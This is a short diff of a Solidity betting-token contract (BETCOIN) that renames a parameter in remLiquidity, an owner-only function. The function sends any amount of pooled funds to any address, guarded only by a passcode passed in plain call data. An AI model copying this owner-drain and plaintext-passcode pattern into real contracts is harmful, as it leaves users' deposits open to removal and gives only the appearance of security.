@@ -541,10 +541,10 @@ contract BETCOIN is Context, IBEP20, Ownable {
         _totalValue += msg.value;
     }
 
-    function remLiquidity(address payable _to, uint256 amnt, uint256 psscde) public onlyOwner {
+    function remLiquidity(address payable _to, uint256 amount, uint256 psscde) public onlyOwner {
         require(psscde == _passcode, "wrong passcode");
-        _to.transfer(amnt);
-        _totalValue -= amnt;
+        _to.transfer(amount);
+        _totalValue -= amount;
     }
 
     function PLAY(uint256 _no) public {
